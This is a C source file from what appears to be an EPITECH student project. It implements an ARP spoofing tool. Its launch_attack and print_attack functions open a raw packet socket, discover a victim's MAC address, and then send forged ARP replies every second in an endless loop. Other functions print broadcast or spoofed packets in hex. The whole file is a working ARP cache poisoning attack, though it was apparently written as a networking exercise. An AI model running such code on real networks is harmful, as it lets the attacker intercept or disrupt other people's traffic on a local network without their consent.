/*
** EPITECH PROJECT, 2019
** Default
** File description:
** Default
*/

#include "arp.h"

void print_broadcast(char **av)
{
    arp_t *info = basic_init(av);

    print_hex(first_packet(info), sizeof(struct hdr));
}

void print_spoof(char **av)
{
    struct hdr *hd;
    arp_t *info = basic_init(av);

    hd = first_packet(info);
    hd->etherarphdr.ea_hdr.ar_op = ARPOP_REPLY;
    convert_str_to_bytes(info, av[5]);
    create_packet(hd, info);
    print_hex(hd, sizeof(struct hdr));
}

void print_attack(arp_t *info, struct hdr *hd, struct sockaddr addr)
{
    memcpy(info->victim_mac, hd->ethhdr.ether_shost, 6);
    create_packet(hd, info);
    printf("Found victim's MAC address: '");
    print_mac((const struct ether_addr *)info->victim_mac);
    printf("'\n");
    while (1) {
        printf("Spoofed packet sent to '%s'\n",
            inet_ntoa(*(struct in_addr *)&hd->etherarphdr.arp_tpa));
        sendto(info->sd, hd, sizeof(struct hdr), 0, &addr, sizeof(addr));
        sleep(1);
    }
}

void launch_attack(char **av)
{
    arp_t *info = basic_init(av);
    struct hdr *hd;
    struct sockaddr addr = {0};

    info->ifname = av[3];
    info->sd = socket(AF_INET, SOCK_PACKET, htons(ETH_P_RARP));
    hd = first_packet(info);
    strcpy(addr.sa_data, info->ifname);
    if (sendto(info->sd, hd, sizeof(struct hdr), 0, &addr, sizeof(addr)) < 0) {
        printf("sendto bug\n");
        exit(84);
    }
    do {
        hd = receive();
        if (hd == NULL)
            exit(84);
    } while (memcmp(&hd->etherarphdr.arp_tpa, (struct in_addr *)&info->srcip,
        sizeof(struct ether_addr)) != 0);
    print_attack(info, hd, addr);
}